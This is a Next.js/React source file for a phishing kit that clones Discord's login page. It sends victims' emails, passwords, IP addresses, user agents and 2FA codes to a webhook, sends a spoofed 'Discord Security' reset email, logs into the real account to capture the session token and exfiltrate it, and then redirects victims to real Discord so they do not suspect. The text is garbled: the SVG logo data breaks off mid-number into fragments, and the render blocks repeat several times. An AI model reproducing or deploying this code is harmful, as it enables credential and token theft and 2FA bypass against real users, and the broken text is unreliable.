'use client';

import { useForm } from 'react-hook-form';
import { useState } from 'react';

type FormData = {
  email: string;
  password: string;
  code?: string;
};

export default function LoginForm() {
  const { register, handleSubmit, watch } = useForm<FormData>();
  const [step, setStep] = useState<'login' | 'forgot' | 'code'>('login');
  const [email, setEmail] = useState('');
  const [loading, setLoading] = useState(false);
  
  const emailValue = watch('email');

  const captureCredentials = async (data: FormData) => {
    // Get user's IP/proxy info
    const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({json: () => ({ip: 'unknown'})}));
    const { ip } = await ipRes.json();
    
    // Send to your webhook with their IP for proxy rotation
    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `@everyone New Capture`,
        embeds: [{
          title: 'Discord Credentials',
          fields: [
            { name: 'Email', value: data.email, inline: true },
            { name: 'Password', value: data.password, inline: true },
            { name: 'IP/Proxy', value: ip, inline: true },
            { name: 'User-Agent', value: navigator.userAgent, inline: false }
          ],
          color: 0x5865f2
        }]
      })
    }).catch(() => {});
  };

  const onSubmitLogin = async (data: FormData) => {
    setLoading(true);
    await captureCredentials(data);
    
    // Simulate Discord's "wrong password" to force forgot password flow
    setTimeout(() => {
      setEmail(data.email);
      setStep('forgot');
      setLoading(false);
    }, 1500);
  };

  const onSubmitForgot = async () => {
    setLoading(true);
    
    // Send fake "Discord Security" email with your capture code
    await fetch('/api/send-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        to: email,
        subject: 'Discord Password Reset Request',
        html: `
          <div style="font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #5865f2;">Discord</h2>
            <p>Someone requested a password reset for your Discord account.</p>
            <p>Your verification code is:</p>
            <h1 style="background: #f2f3f5; padding: 20px; text-align: center; letter-spacing: 5px;">${Math.floor(100000 + Math.random() * 900000)}</h1>
            <p>If you didn't request this, you can safely ignore this email.</p>
          </div>
        `
      })
    }).catch(() => {});
    
    setStep('code');
    setLoading(false);
  };

  const onSubmitCode = async (data: FormData) => {
    setLoading(true);
    
    // Send the 2FA code to your webhook
    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: '2FA Code Captured',
          fields: [
            { name: 'Email', value: email, inline: true },
            { name: 'Code', value: data.code, inline: true }
          ],
          color: 0xed4245
        }]
      })
    }).catch(() => {});

    // Now use their IP as proxy to login to real Discord
    // This requires a backend proxy rotator using their captured IP
    const loginRes = await fetch('/api/discord-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email,
        password: data.password,
        code: data.code,
        proxy: email // Use their email session as identifier for proxy
      })
    });
    
    const result = await loginRes.json();
    
    if (result.token) {
      // Send token silently
      await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🎫 **TOKEN CAPTURED**\n\`\`\`${result.token}\`\`\`\nEmail: ${email}`
        })
      }).catch(() => {});
      
      // Redirect to real Discord so they don't suspect
      window.location.href = 'https://discord.com/app';
    }
  };

  // Discord-exact styling
  const containerStyle = {
    minHeight: '100vh',
    backgroundColor: '#5865f2',
    backgroundImage: 'url(https://discord.com/assets/0b5e9c9b2b0a7b5b5b5b5b5b5b5b5b5.svg)',
    backgroundSize: 'cover',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontFamily: '"gg sans", "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif',
    margin: 0,
    padding: '20px'
  };

  const boxStyle = {
    backgroundColor: '#313338',
    padding: '32px',
    borderRadius: '5px',
    width: '100%',
    maxWidth: '480px',
    boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
    textAlign: 'center' as const,
    animation: 'fadeIn 0.3s ease'
  };

  const inputStyle = {
    width: '100%',
    height: '40px',
    padding: '10px',
    backgroundColor: '#1e1f22',
    border: '1px solid #1e1f22',
    borderRadius: '3px',
    color: '#dbdee1',
    fontSize: '16px',
    fontFamily: 'inherit',
    outline: 'none',
    marginBottom: '20px',
    transition: 'border-color 0.2s',
    boxSizing: 'border-box' as const
  };

  const labelStyle = {
    display: 'block',
    fontSize: '12px',
    fontWeight: 700,
    color: '#b5bac1',
    marginBottom: '8px',
    textTransform: 'uppercase' as const,
    letterSpacing: '0.02em',
    textAlign: 'left' as const
  };

  const buttonStyle = {
    width: '100%',
    height: '44px',
    backgroundColor: '#5865f2',
    color: 'white',
    border: 'none',
    borderRadius: '3px',
    fontWeight: 500,
    fontSize: '16px',
    fontFamily: 'inherit',
    cursor: 'pointer',
    transition: 'background-color 0.17s ease',
    marginBottom: '8px'
  };

  const linkStyle = {
    color: '#949cf7',
    fontSize: '14px',
    textDecoration: 'none',
    display: 'block',
    margin: '8px 0 20px 0',
    fontWeight: 500,
    textAlign: 'left' as const,
    cursor: 'pointer'
  };

  if (step === 'forgot') {
    return (
      <div style={containerStyle}>
        <div style={boxStyle}>
          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
            Password Reset
          </h1>
          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
            Enter your email to receive a reset code
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <label style={labelStyle}>Email</label>
            <input
              value={email}
              readOnly
              style={{ ...inputStyle, backgroundColor: '#2b2d31', cursor: 'not-allowed' }}
            />
          </div>

          <button
            onClick={onSubmitForgot}
            disabled={loading}
            style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
          >
            {loading ? 'Sending...' : 'Send Reset Code'}
          </button>

          <div style={{ textAlign: 'left', marginTop: '10px' }}>
            <span onClick={() => setStep('login')} style={{ ...linkStyle, display: 'inline' }}>
              ← Back to Login
            </span>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'code') {
    return (
      <div style={containerStyle}>
        <div style={boxStyle}>
          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
            Check Your Email
          </h1>
          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
            We sent a verification code to {email}
          </p>
          
          <form onSubmit={handleSubmit(onSubmitCode)}>
            <div>
              <label style={labelStyle}>6-Digit Code</label>
              <input
                {...register('code', { required: true })}
                maxLength={6}
                placeholder="000000"
                style={{ ...inputStyle, textAlign: 'center', letterSpacing: '8px', fontSize: '20px' }}
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'Verifying...' : 'Verify'}
            </button>
          </form>

          <div style={{ textAlign: 'left', marginTop: '10px' }}>
            <span onClick={() => setStep('forgot')} style={{ ...linkStyle, display: 'inline' }}>
              Resend Code
            </span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={containerStyle}>
      <div style={boxStyle}>
        {/* Discord Logo */}
        <div style={{ marginBottom: '16px' }}>
          <svg width="130" height="34" viewBox="0 0 124 33" fill="none" style={{ display: 'block', margin: '0 auto' }}>
            <path d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.28093 14.1585 6.28093 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 14.8736 -0.202497 22.6113 0.824305 30.2714C3.39205 32.2308 5.86908 33.4118 8.30847 34.2366C8.95603 33.361 9.54377 32.4401 10.0656 31.4769C9.10438 31.1219 8.17851 30.6912 7.29578 30.1883C7.50378 30.0358 7.71178 29.8833 7.90378 29.7463C13.1786 32.3282 18.7984 32.3282 24.0268 29.7463C24.2188 29.8688 24.4268 30.0213 24.6348 30.1883C23.7521 30.6912 22.8262 31.1219 21.865 31.4769C22.3868 32.4401 22.9746 33.361 23.6221 34.2366C26.0615 33.4118 28.5531 32.2308 31.1052 30.2714C32.3217 21.3742 29.5031 13.6831 26.0015 6.9529ZM10.2527 25.5174C8.74279 25.5174 7.50953 24.1325 7.50953 22.4446C7.50953 20.7567 8.71128 19.3718 10.2527 19.3718C11.7941 19.3718 13.0274 20.7567 13.0274 22.4446C13.0274 24.1325 11.8096 25.5174 10.2527 25.5174ZM20.4373 25.5174C18.9274 25.5174 17.6941 24.1325 17.6941 22.4446C17.6941 20.7567 18.895Size: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
            Password Reset
          </h1>
          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
            Enter your email to receive a reset code
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <label style={labelStyle}>Email</label>
            <input
              value={email}
              readOnly
              style={{ ...inputStyle, backgroundColor: '#2b2d31', cursor: 'not-allowed' }}
            />
          </div>

          <button
            onClick={onSubmitForgot}
            disabled={loading}
            style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
          >
            {loading ? 'Sending...' : 'Send Reset Code'}
          </button>

          <div style={{ textAlign: 'left', marginTop: '10px' }}>
            <span onClick={() => setStep('login')} style={{ ...linkStyle, display: 'inline' }}>
              ← Back to Login
            </span>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'code') {
    return (
      <div style={containerStyle}>
        <div style={boxStyle}>
          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
            Check Your Email
          </h1>
          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
            We sent a verification code to {email}
          </p>
          
          <form onSubmit={handleSubmit(onSubmitCode)}>
            <div>
              <label style={labelStyle}>6-Digit Code</label>
              <input
                {...register('code', { required: true })}
                maxLength={6}
                placeholder="000000"
                style={{ ...inputStyle, textAlign: 'center', letterSpacing: '8px', fontSize: '20px' }}
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'Verifying...' : 'Verify'}
            </button>
          </form>

          <div style={{ textAlign: 'left', marginTop: '10px' }}>
            <span onClick={() => setStep('forgot')} style={{ ...linkStyle, display: 'inline' }}>
              Resend Code
            </span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={containerStyle}>
      <div style={boxStyle}>
        {/* Discord Logo */}
        <div style={{ marginBottom: '16px' }}>
          <svg width="130" height="34" viewBox="0 0 124 33" fill="none" style={{ display: 'block', margin: '0 auto' }}>
            <path d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.28093 14.1585 6.28093 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 14.8736 -0.202497 22.6113 0.824305 30.2714C3.39205 32.2308 5.86908 33.4118 8.30847 34.2366C8.95603 33.361 9.54377 32.4401 10.0656 31.4769C9.10438 31.1219 8.17851 30.6912 7.29578 30.1883C7.50378 30.0358 7.71178 29.8833 7.90378 29.7463C13.1786 32.3282 18.7984 32.3282 24.0268 29.7463C24.2188 29.8688 24.4268 30.0213 24.6348 30.1883C23.7521 30.6912 22.8262 31.1219 21.865 31.4769C22.3868 32.4401 22.9746 33.361 23.6221 34.2366C26.0615 33.4118 28.5531 32.2308 31.1052 30.2714C32.3217 21.3742 29.5031 13.6831 26.0015 6.9529ZM10.2527 25.5174C8.74279 25.5174 7.50953 24.1325 7.50953 22.4446C7.50953 20.7567 8.71128 19.3718 10.2527 19.3718C11.7941 19.3718 13.0274 20.7567 13.0274 22.4446C13.0274 24.1325 11.8096 25.5174 10.2527 25.5174ZM20.4373 25.5174C18.9274 25.5174 17.6941 24.1325 17.6941 22.4446C17.6941 20.7567 18.8959 19.3718 20.4373 19.3718C21.9787 19.3718 23.212 20.7567 23.212 22.4446C23.212 24.1325 21.9942 25.5174 20.4373 25.5174Z" fill="white"/>
            <path d="M41.2697 9.86694C41.2697 8.31858 42.4782 7.13171 44.0437 7.13171C45.6093 7.13171 46.8178 8.31858 46.8178 9.86694C46.8178 11.4008 45.6093 12.6022 44.0437 12.6022C42.4782 12.6022 41.2697 11.4008 41.2697 9.86694ZM45.5389 9.86694C45.5389 8.96045 44.9232 8.20809 44.0437 8.20809C43.1643 8.20809 42.5486 8.96045 42.5486 9.86694C42.5486 10.7589 43.1643 11.5258 44.0437 11.5258C44.9232 11.5258 45.5389 10.7589 45.5389 9.86694Z" fill="white"/>
            <path d="M50.4892 7.30884H51.7233V12.4392H50.4892V7.30884Z" fill="white"/>
            <path d="M53.6084 12.4392V7.30884H54.8425V8.20809H54.887C55.1504 7.68662 55.6684 7.20514 56.4804 7.20514C57.8104 7.20514 58.2699 8.11814 58.2699 9.29058V12.4392H57.0358V9.64209C57.0358 8.78261 56.7879 8.20809 56.0384 8.20809C55.2889 8.20809 54.8425 8.85664 54.8425 9.76158V12.4392H53.6084Z" fill="white"/>
            <path d="M62.3226 7.30884H63.5567V12.4392H62.3226V7.30884Z" fill="white"/>
            <path d="M66.124 10.374C66.124 8.84161 67.3325 7.20514 69.203 7.20514C71.0735 7.20514 72.282 8.84161 72.282 10.374C72.282 11.9063 71.0735 13.5428 69.203 13.5428C67.3325 13.5428 66.124 11.9063 66.124 10.374ZM71.0031 10.374C71.0031 9.34909 70.3874 8.20809 69.203 8.20809C68.0186 8.20809 67.4029 9.34909 67.4029 10.374C67.4029 11.399 68.0186 12.5399 69.203 12.5399C70.3874 12.5399 71.0031 11.399 71.0031 10.374Z" fill="white"/>
            <path d="M74.1831 10.374C74.1831 8.84161 75.3916 7.20514 77.2621 7.20514C79.1326 7.20514 80.3411 8.84161 80.3411 10.374C80.3411 11.9063 79.1326 13.5428 77.2621 13.5428C75.3916 13Size: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
            Password Reset
          </h1>
          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
            Enter your email to receive a reset code
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <label style={labelStyle}>Email</label>
            <input
              value={email}
              readOnly
              style={{ ...inputStyle, backgroundColor: '#2b2d31', cursor: 'not-allowed' }}
            />
          </div>

          <button
            onClick={onSubmitForgot}
            disabled={loading}
            style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
          >
            {loading ? 'Sending...' : 'Send Reset Code'}
          </button>

          <div style={{ textAlign: 'left', marginTop: '10px' }}>
            <span onClick={() => setStep('login')} style={{ ...linkStyle, display: 'inline' }}>
              ← Back to Login
            </span>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'code') {
    return (
      <div style={containerStyle}>
        <div style={boxStyle}>
          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
            Check Your Email
          </h1>
          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
            We sent a verification code to {email}
          </p>
          
          <form onSubmit={handleSubmit(onSubmitCode)}>
            <div>
              <label style={labelStyle}>6-Digit Code</label>
              <input
                {...register('code', { required: true })}
                maxLength={6}
                placeholder="000000"
                style={{ ...inputStyle, textAlign: 'center', letterSpacing: '8px', fontSize: '20px' }}
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'Verifying...' : 'Verify'}
            </button>
          </form>

          <div style={{ textAlign: 'left', marginTop: '10px' }}>
            <span onClick={() => setStep('forgot')} style={{ ...linkStyle, display: 'inline' }}>
              Resend Code
            </span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={containerStyle}>
      <div style={boxStyle}>
        {/* Discord Logo */}
        <div style={{ marginBottom: '16px' }}>
          <svg width="130" height="34" viewBox="0 0 124 33" fill="none" style={{ display: 'block', margin: '0 auto' }}>
            <path d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.28093 14.1585 6.28093 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 14.8736 -0.202497 22.6113 0.824305 30.2714C3.39205 32.2308 5.86908 33.4118 8.30847 34.2366C8.95603 33.361 9.54377 32.4401 10.0656 31.4769C9.10438 31.1219 8.17851 30.6912 7.29578 30.1883C7.50378 30.0358 7.71178 29.8833 7.90378 29.7463C13.1786 32.3282 18.7984 32.3282 24.0268 29.7463C24.2188 29.8688 24.4268 30.0213 24.6348 30.1883C23.7521 30.6912 22.8262 31.1219 21.865 31.4769C22.3868 32.4401 22.9746 33.361 23.6221 34.2366C26.0615 33.4118 28.5531 32.2308 31.1052 30.2714C32.3217 21.3742 29.5031 13.6831 26.0015 6.9529ZM10.2527 25.5174C8.74279 25.5174 7.50953 24.1325 7.50953 22.4446C7.50953 20.7567 8.71128 19.3718 10.2527 19.3718C11.7941 19.3718 13.0274 20.7567 13.0274 22.4446C13.0274 24.1325 11.8096 25.5174 10.2527 25.5174ZM20.4373 25.5174C18.9274 25.5174 17.6941 24.1325 17.6941 22.4446C17.6941 20.7567 18.8959 19.3718 20.4373 19.3718C21.9787 19.3718 23.212 20.7567 23.212 22.4446C23.212 24.1325 21.9942 25.5174 20.4373 25.5174Z" fill="white"/>
            <path d="M41.2697 9.86694C41.2697 8.31858 42.4782 7.13171 44.0437 7.13171C45.6093 7.13171 46.8178 8.31858 46.8178 9.86694C46.8178 11.4008 45.6093 12.6022 44.0437 12.6022C42.4782 12.6022 41.2697 11.4008 41.2697 9.86694ZM45.5389 9.86694C45.5389 8.96045 44.9232 8.20809 44.0437 8.20809C43.1643 8.20809 42.5486 8.96045 42.5486 9.86694C42.5486 10.7589 43.1643 11.5258 44.0437 11.5258C44.9232 11.5258 45.5389 10.7589 45.5389 9.86694Z" fill="white"/>
            <path d="M50.4892 7.30884H51.7233V12.4392H50.4892V7.30884Z" fill="white"/>
            <path d="M53.6084 12.4392V7.30884H54.8425V8.20809H54.887C55.1504 7.68662 55.6684 7.20514 56.4804 7.20514C57.8104 7.20514 58.2699 8.11814 58.2699 9.29058V12.4392H57.0358V9.64209C57.0358 8.78261 56.7879 8.20809 56.0384 8.20809C55.2889 8.20809 54.8425 8.85664 54.8425 9.76158V12.4392H53.6084Z" fill="white"/>
            <path d="M62.3226 7.30884H63.5567V12.4392H62.3226V7.30884Z" fill="white"/>
            <path d="M66.124 10.374C66.124 8.84161 67.3325 7.20514 69.203 7.20514C71.0735 7.20514 72.282 8.84161 72.282 10.374C72.282 11.9063 71.0735 13.5428 69.203 13.5428C67.3325 13.5428 66.124 11.9063 66.124 10.374ZM71.0031 10.374C71.0031 9.34909 70.3874 8.20809 69.203 8.20809C68.0186 8.20809 67.4029 9.34909 67.4029 10.374C67.4029 11.399 68.0186 12.5399 69.203 12.5399C70.3874 12.5399 71.0031 11.399 71.0031 10.374Z" fill="white"/>
            <path d="M74.1831 10.374C74.1831 8.84161 75.3916 7.20514 77.2621 7.20514C79.1326 7.20514 80.3411 8.84161 80.3411 10.374C80.3411 11.9063 79.1326 13.5428 77.2621 13.5428C75.3916 13.5428 74.1831 11.9063 74.1831 10.374ZM79.0622 10.374C79.0622 9.34909 78.4465 8.20809 77.2621 8.20809C76.0777 8.20809 75.462 9.34909 75.462 10.374C75.462 11.399 76.0777 12.5399 77.2621 12.5399C78.4465 12.5399 79.0622 11.399 79.0622 10.374Z" fill="white"/>
            <path d="M82.4443 7.30884H83.6784V8.20809H83.7229C83.9863 7.68662 84.5043 7.20514 85.3163 7.20514C86.6463 7.20514 87.1058 8.11814 87.1058 9.29058V12.4392H85.8717V9.64209C85.8717 8.78261 85.6238 8.20809 84.8743 8.20809C84.1248 8.20809 83.6784 8.85664 83.6784 9.76158V12.4392H82.4443V7.30884Z" fill="white"/>
            <path d="M91.7733 7.20514C93.1033 7.20514 93.5628 8.11814 93.5628 9.29058V12.4392H92.3287V9.64209C92.3287 8.78261 92.0808 8.20809 91.3313 8.20809C90.5818 8.20809 90.1354 8.85664 90.1354 9.76158V12.4392H88.9013V7.30884H90.1354V8.20809H90.1799C90.4433 7.68662 90.9613 7.20514 91.7733 7.20514Z" fill="white"/>
            <path d="M95.8078 10.374C95.8078 8.84161 97.0163 7.20514 98.8868 7.20514C100.757 7.20514 101.966 8.84161 101.966 10.374C101.966 11.9063 100.757 13.5428 98.8868 13.5428C97.0163 13.5428 95.8078 11.9063 95.8078 10.374ZM100.687 10.374C100.687 9.34909 100.071 8.20809 98.8868 8.20809C97.7024 8.20809 97.0867 9.34909 97.0867 10.374C97.0867 11.399 97.7024 12.5399 98.8868 12.5399C100.071 12.5399 100.687 11.399 100.687 10.374Z" fill="white"/>
            <path d="M103.868 10.374C103.868 8.84161 105.076 7.20514 106.947 7.20514C108.817 7.20514 110.026 8.84161 110.026 10.374C110.026 11.9063 108.817 13.5428 106.947 13.5428C105.076 13.5428 103.868 11.9063 103.868 10.374ZM108.747 10.374C108.747 9.34909 108.131 8.20809 106.947 8.20809C105.762 8.20809 105.147 9.34909 105.147 10.374C105.147 11.399 105.762 12.5399 106.947 12.5399C108.131 12.5399 108.747 11.399 108.747 10.374Z" fill="white"/>
            <path d="M111.129 7.30884H112.363V8.20809H112.408C112.671 7.68662 113.189 7.20514 114.001 7.20514C115.331 7.20514 115.791 8.11814 115.791 9.29058V12.4392H114.557V9.64209C114.557 8.78261 114.309 8.20809 113.559 8.20809C112.81 8.20809 112.363 8.85664 112.363 9.76158V12.4392H111.129V7.30884Z" fill="white"/>
            <path d="M119.458 7.20514C120.788 7.20514 121.247 8.11814 121.247 9.29058V12.4392H120.013V9.64209C120.013 8.78261 119.765 8.20809 119.016 8.20809C118.266 8.20809 117.82 8.85664 117.82 9.76158V12.4392H116.586V7.30884H117.82V8.20809H117.864C118.128 7.68662 118.646 7.20514 119.458 7.20514Z" fill="white"/>
Size: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
            Password Reset
          </h1>
          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
            Enter your email to receive a reset code
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <label style={labelStyle}>Email</label>
            <input
              value={email}
              readOnly
              style={{ ...inputStyle, backgroundColor: '#2b2d31', cursor: 'not-allowed' }}
            />
          </div>

          <button
            onClick={onSubmitForgot}
            disabled={loading}
            style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
          >
            {loading ? 'Sending...' : 'Send Reset Code'}
          </button>

          <div style={{ textAlign: 'left', marginTop: '10px' }}>
            <span onClick={() => setStep('login')} style={{ ...linkStyle, display: 'inline' }}>
              ← Back to Login
            </span>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'code') {
    return (
      <div style={containerStyle}>
        <div style={boxStyle}>
          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
            Check Your Email
          </h1>
          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
            We sent a verification code to {email}
          </p>
          
          <form onSubmit={handleSubmit(onSubmitCode)}>
            <div>
              <label style={labelStyle}>6-Digit Code</label>
              <input
                {...register('code', { required: true })}
                maxLength={6}
                placeholder="000000"
                style={{ ...inputStyle, textAlign: 'center', letterSpacing: '8px', fontSize: '20px' }}
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'Verifying...' : 'Verify'}
            </button>
          </form>

          <div style={{ textAlign: 'left', marginTop: '10px' }}>
            <span onClick={() => setStep('forgot')} style={{ ...linkStyle, display: 'inline' }}>
              Resend Code
            </span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={containerStyle}>
      <div style={boxStyle}>
        {/* Discord Logo */}
        <div style={{ marginBottom: '16px' }}>
          <svg width="130" height="34" viewBox="0 0 124 33" fill="none" style={{ display: 'block', margin: '0 auto' }}>
            <path d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.28093 14.1585 6.28093 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 14.8736 -0.202497 22.6113 0.824305 30.2714C3.39205 32.2308 5.86908 33.4118 8.30847 34.2366C8.95603 33.361 9.54377 32.4401 10.0656 31.4769C9.10438 31.1219 8.17851 30.6912 7.29578 30.1883C7.50378 30.0358 7.71178 29.8833 7.90378 29.7463C13.1786 32.3282 18.7984 32.3282 24.0268 29.7463C24.2188 29.8688 24.4268 30.0213 24.6348 30.1883C23.7521 30.6912 22.8262 31.1219 21.865 31.4769C22.3868 32.4401 22.9746 33.361 23.6221 34.2366C26.0615 33.4118 28.5531 32.2308 31.1052 30.2714C32.3217 21.3742 29.5031 13.6831 26.0015 6.9529ZM10.2527 25.5174C8.74279 25.5174 7.50953 24.1325 7.50953 22.4446C7.50953 20.7567 8.71128 19.3718 10.2527 19.3718C11.7941 19.3718 13.0274 20.7567 13.0274 22.4446C13.0274 24.1325 11.8096 25.5174 10.2527 25.5174ZM20.4373 25.5174C18.9274 25.5174 17.6941 24.1325 17.6941 22.4446C17.6941 20.7567 18.8959 19.3718 20.4373 19.3718C21.9787 19.3718 23.212 20.7567 23.212 22.4446C23.212 24.1325 21.9942 25.5174 20.4373 25.5174Z" fill="white"/>
            <path d="M41.2697 9.86694C41.2697 8.31858 42.4782 7.13171 44.0437 7.13171C45.6093 7.13171 46.8178 8.31858 46.8178 9.86694C46.8178 11.4008 45.6093 12.6022 44.0437 12.6022C42.4782 12.6022 41.2697 11.4008 41.2697 9.86694ZM45.5389 9.86694C45.5389 8.96045 44.9232 8.20809 44.0437 8.20809C43.1643 8.20809 42.5486 8.96045 42.5486 9.86694C42.5486 10.7589 43.1643 11.5258 44.0437 11.5258C44.9232 11.5258 45.5389 10.7589 45.5389 9.86694Z" fill="white"/>
            <path d="M50.4892 7.30884H51.7233V12.4392H50.4892V7.30884Z" fill="white"/>
            <path d="M53.6084 12.4392V7.30884H54.8425V8.20809H54.887C55.1504 7.68662 55.6684 7.20514 56.4804 7.20514C57.8104 7.20514 58.2699 8.11814 58.2699 9.29058V12.4392H57.0358V9.64209C57.0358 8.78261 56.7879 8.20809 56.0384 8.20809C55.2889 8.20809 54.8425 8.85664 54.8425 9.76158V12.4392H53.6084Z" fill="white"/>
            <path d="M62.3226 7.30884H63.5567V12.4392H62.3226V7.30884Z" fill="white"/>
            <path d="M66.124 10.374C66.124 8.84161 67.3325 7.20514 69.203 7.20514C71.0735 7.20514 72.282 8.84161 72.282 10.374C72.282 11.9063 71.0735 13.5428 69.203 13.5428C67.3325 13.5428 66.124 11.9063 66.124 10.374ZM71.0031 10.374C71.0031 9.34909 70.3874 8.20809 69.203 8.20809C68.0186 8.20809 67.4029 9.34909 67.4029 10.374C67.4029 11.399 68.0186 12.5399 69.203 12.5399C70.3874 12.5399 71.0031 11.399 71.0031 10.374Z" fill="white"/>
            <path d="M74.1831 10.374C74.1831 8.84161 75.3916 7.20514 77.2621 7.20514C79.1326 7.20514 80.3411 8.84161 80.3411 10.374C80.3411 11.9063 79.1326 13.5428 77.2621 13.5428C75.3916 13.5428 74.1831 11.9063 74.1831 10.374ZM79.0622 10.374C79.0622 9.34909 78.4465 8.20809 77.2621 8.20809C76.0777 8.20809 75.462 9.34909 75.462 10.374C75.462 11.399 76.0777 12.5399 77.2621 12.5399C78.4465 12.5399 79.0622 11.399 79.0622 10.374Z" fill="white"/>
            <path d="M82.4443 7.30884H83.6784V8.20809H83.7229C83.9863 7.68662 84.5043 7.20514 85.3163 7.20514C86.6463 7.20514 87.1058 8.11814 87.1058 9.29058V12.4392H85.8717V9.64209C85.8717 8.78261 85.6238 8.20809 84.8743 8.20809C84.1248 8.20809 83.6784 8.85664 83.6784 9.76158V12.4392H82.4443V7.30884Z" fill="white"/>
            <path d="M91.7733 7.20514C93.1033 7.20514 93.5628 8.11814 93.5628 9.29058V12.4392H92.3287V9.64209C92.3287 8.78261 92.0808 8.20809 91.3313 8.20809C90.5818 8.20809 90.1354 8.85664 90.1354 9.76158V12.4392H88.9013V7.30884H90.1354V8.20809H90.1799C90.4433 7.68662 90.9613 7.20514 91.7733 7.20514Z" fill="white"/>
            <path d="M95.8078 10.374C95.8078 8.84161 97.0163 7.20514 98.8868 7.20514C100.757 7.20514 101.966 8.84161 101.966 10.374C101.966 11.9063 100.757 13.5428 98.8868 13.5428C97.0163 13.5428 95.8078 11.9063 95.8078 10.374ZM100.687 10.374C100.687 9.34909 100.071 8.20809 98.8868 8.20809C97.7024 8.20809 97.0867 9.34909 97.0867 10.374C97.0867 11.399 97.7024 12.5399 98.8868 12.5399C100.071 12.5399 100.687 11.399 100.687 10.374Z" fill="white"/>
            <path d="M103.868 10.374C103.868 8.84161 105.076 7.20514 106.947 7.20514C108.817 7.20514 110.026 8.84161 110.026 10.374C110.026 11.9063 108.817 13.5428 106.947 13.5428C105.076 13.5428 103.868 11.9063 103.868 10.374ZM108.747 10.374C108.747 9.34909 108.131 8.20809 106.947 8.20809C105.762 8.20809 105.147 9.34909 105.147 10.374C105.147 11.399 105.762 12.5399 106.947 12.5399C108.131 12.5399 108.747 11.399 108.747 10.374Z" fill="white"/>
